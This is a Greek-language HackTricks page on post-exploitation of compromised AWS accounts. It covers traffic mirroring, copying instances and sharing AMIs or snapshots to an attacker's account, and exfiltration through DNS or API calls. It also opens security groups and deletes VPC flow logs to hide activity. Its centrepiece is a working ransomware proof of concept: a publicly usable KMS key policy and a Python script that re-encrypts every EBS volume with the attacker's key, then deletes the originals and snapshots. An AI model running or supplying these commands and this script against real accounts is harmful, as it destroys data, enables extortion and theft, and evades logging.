# AWS - EC2, EBS, SSM & VPC Post Exploitation

{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια github.

</details>
{% endhint %}

## EC2 & VPC

Για περισσότερες πληροφορίες ελέγξτε:

{% content-ref url="../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

Η αντανάκλαση κυκλοφορίας VPC **διπλασιάζει την εισερχόμενη και εξερχόμενη κυκλοφορία για EC2 instances μέσα σε ένα VPC** χωρίς την ανάγκη εγκατάστασης οτιδήποτε στα ίδια τα instances. Αυτή η διπλασιασμένη κυκλοφορία συνήθως αποστέλλεται σε κάτι σαν σύστημα ανίχνευσης εισβολών δικτύου (IDS) για ανάλυση και παρακολούθηση.\
Ένας επιτιθέμενος θα μπορούσε να το εκμεταλλευτεί αυτό για να καταγράψει όλη την κυκλοφορία και να αποκτήσει ευαίσθητες πληροφορίες από αυτήν:

Για περισσότερες πληροφορίες ελέγξτε αυτή τη σελίδα:

{% content-ref url="aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Αντιγραφή Τρέχοντος Instance

Τα instances συνήθως περιέχουν κάποιο είδος ευαίσθητων πληροφοριών. Υπάρχουν διάφοροι τρόποι για να μπείτε μέσα (ελέγξτε [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc.md)). Ωστόσο, ένας άλλος τρόπος για να ελέγξετε τι περιέχει είναι να **δημιουργήσετε ένα AMI και να τρέξετε ένα νέο instance (ακόμα και στον δικό σας λογαριασμό) από αυτό**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Τα Snapshots είναι αντίγραφα ασφαλείας των volumes**, τα οποία συνήθως θα περιέχουν **ευαίσθητες πληροφορίες**, επομένως ο έλεγχός τους θα αποκαλύψει αυτές τις πληροφορίες.\
Αν βρείτε ένα **volume χωρίς snapshot** μπορείτε: **Να δημιουργήσετε ένα snapshot** και να εκτελέσετε τις παρακάτω ενέργειες ή απλά **να το προσαρτήσετε σε μια instance** μέσα στον λογαριασμό:

{% content-ref url="aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Data Exfiltration

#### DNS Exfiltration

Ακόμα και αν κλειδώσετε ένα EC2 ώστε να μην μπορεί να βγει καμία κίνηση, μπορεί ακόμα **να εξάγει δεδομένα μέσω DNS**.

* **Τα VPC Flow Logs δεν θα καταγράψουν αυτό**.
* Δεν έχετε πρόσβαση στα AWS DNS logs.
*   Απενεργοποιήστε αυτό ρυθμίζοντας το "enableDnsSupport" σε false με:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration μέσω API calls

Ένας επιτιθέμενος θα μπορούσε να καλέσει API endpoints ενός λογαριασμού που ελέγχεται από αυτόν. Το Cloudtrail θα καταγράψει αυτές τις κλήσεις και ο επιτιθέμενος θα μπορεί να δει τα εξαγόμενα δεδομένα στα Cloudtrail logs.

### Open Security Group

Μπορείτε να αποκτήσετε περαιτέρω πρόσβαση σε υπηρεσίες δικτύου ανοίγοντας θύρες όπως αυτή:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### Privesc to ECS

Είναι δυνατό να τρέξετε ένα EC2 instance και να το καταχωρήσετε για να χρησιμοποιηθεί για την εκτέλεση ECS instances και στη συνέχεια να κλέψετε τα δεδομένα των ECS instances.

Για [**περισσότερες πληροφορίες ελέγξτε αυτό**](../../aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### Κοινοποίηση AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### Κοινοποίηση EBS Snapshot

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

Μια απόδειξη της έννοιας παρόμοια με την επίδειξη Ransomware που παρουσιάστηκε στις σημειώσεις μετά την εκμετάλλευση του S3. Το KMS θα πρέπει να μετονομαστεί σε RMS για Ransomware Management Service με το πόσο εύκολο είναι να το χρησιμοποιήσετε για την κρυπτογράφηση διαφόρων υπηρεσιών AWS χρησιμοποιώντας το.

Πρώτα από έναν λογαριασμό AWS 'επιτιθέμενου', δημιουργήστε ένα customer managed key στο KMS. Για αυτό το παράδειγμα, θα αφήσουμε την AWS να διαχειριστεί τα δεδομένα του κλειδιού για μένα, αλλά σε ένα ρεαλιστικό σενάριο ένας κακόβουλος παράγοντας θα διατηρούσε τα δεδομένα του κλειδιού εκτός του ελέγχου της AWS. Αλλάξτε την πολιτική κλειδιού για να επιτρέψετε σε οποιονδήποτε AWS account Principal να χρησιμοποιήσει το κλειδί. Για αυτήν την πολιτική κλειδιού, το όνομα του λογαριασμού ήταν 'AttackSim' και ο κανόνας πολιτικής που επιτρέπει όλη την πρόσβαση ονομάζεται 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Ο κανόνας πολιτικής κλειδιού χρειάζεται τα ακόλουθα ενεργοποιημένα για να επιτρέψει τη χρήση του για κρυπτογράφηση ενός EBS volume:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

Τώρα με το δημόσια προσβάσιμο κλειδί για χρήση. Μπορούμε να χρησιμοποιήσουμε έναν λογαριασμό 'victim' που έχει κάποιες EC2 instances με συνδεδεμένα μη κρυπτογραφημένα EBS volumes. Τα EBS volumes αυτού του λογαριασμού 'victim' είναι αυτά που στοχεύουμε για κρυπτογράφηση, αυτή η επίθεση γίνεται υπό την υπόθεση παραβίασης ενός λογαριασμού AWS με υψηλά προνόμια.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Παρόμοια με το παράδειγμα ransomware του S3. Αυτή η επίθεση θα δημιουργήσει αντίγραφα των συνδεδεμένων EBS volumes χρησιμοποιώντας snapshots, θα χρησιμοποιήσει το δημόσια διαθέσιμο κλειδί από τον λογαριασμό 'attacker' για να κρυπτογραφήσει τα νέα EBS volumes, στη συνέχεια θα αποσυνδέσει τα αρχικά EBS volumes από τις EC2 instances και θα τα διαγράψει, και τέλος θα διαγράψει τα snapshots που χρησιμοποιήθηκαν για τη δημιουργία των νέων κρυπτογραφημένων EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Αυτό έχει ως αποτέλεσμα να παραμένουν διαθέσιμα στον λογαριασμό μόνο κρυπτογραφημένα EBS volumes.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Επίσης αξίζει να σημειωθεί, το script σταμάτησε τις EC2 instances για να αποσυνδέσει και να διαγράψει τα αρχικά EBS volumes. Τα αρχικά μη κρυπτογραφημένα volumes έχουν πλέον εξαφανιστεί.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Στη συνέχεια, επιστρέψτε στην πολιτική κλειδιού στον λογαριασμό 'attacker' και αφαιρέστε τον κανόνα πολιτικής 'Outside Encryption' από την πολιτική κλειδιού.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Περιμένετε λίγο για να διαδοθεί η νέα πολιτική κλειδιού. Στη συνέχεια, επιστρέψτε στον λογαριασμό 'victim' και προσπαθήστε να συνδέσετε έναν από τους νεοκρυπτογραφημένους EBS volumes. Θα διαπιστώσετε ότι μπορείτε να συνδέσετε τον volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Αλλά όταν προσπαθήσετε να ξεκινήσετε ξανά το EC2 instance με τον κρυπτογραφημένο EBS volume, θα αποτύχει και θα μεταβεί από την κατάσταση 'pending' πίσω στην κατάσταση 'stopped' για πάντα, καθώς ο συνδεδεμένος EBS volume δεν μπορεί να αποκρυπτογραφηθεί χρησιμοποιώντας το κλειδί, αφού η πολιτική κλειδιού δεν το επιτρέπει πλέον.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Αυτό είναι το python script που χρησιμοποιείται. Λαμβάνει AWS creds για έναν λογαριασμό 'victim' και μια δημόσια διαθέσιμη AWS ARN τιμή για το κλειδί που θα χρησιμοποιηθεί για την κρυπτογράφηση. Το script θα δημιουργήσει κρυπτογραφημένα αντίγραφα ΟΛΩΝ των διαθέσιμων EBS volumes που είναι συνδεδεμένα σε ΟΛΑ τα EC2 instances στον στοχευμένο AWS λογαριασμό, στη συνέχεια θα σταματήσει κάθε EC2 instance, θα αποσυνδέσει τους αρχικούς EBS volumes, θα τους διαγράψει και τελικά θα διαγράψει όλα τα snapshots που χρησιμοποιήθηκαν κατά τη διαδικασία. Αυτό θα αφήσει μόνο κρυπτογραφημένους EBS volumes στον στοχευμένο λογαριασμό 'victim'. ΧΡΗΣΙΜΟΠΟΙΗΣΤΕ ΑΥΤΟ ΤΟ SCRIPT ΜΟΝΟ ΣΕ ΠΕΡΙΒΑΛΛΟΝ ΔΟΚΙΜΩΝ, ΕΙΝΑΙ ΚΑΤΑΣΤΡΟΦΙΚΟ ΚΑΙ ΘΑ ΔΙΑΓΡΑΨΕΙ ΟΛΟΥΣ ΤΟΥΣ ΑΡΧΙΚΟΥΣ EBS VOLUMES. Μπορείτε να τους ανακτήσετε χρησιμοποιώντας το χρησιμοποιημένο KMS key και να τους επαναφέρετε στην αρχική τους κατάσταση μέσω snapshots, αλλά θέλω απλώς να σας ενημερώσω ότι αυτό είναι ένα ransomware PoC στο τέλος της ημέρας.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
{% hint style="success" %}
Μάθετε και εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε και εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Δείτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Γίνετε μέλος της** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε hacking tricks υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}
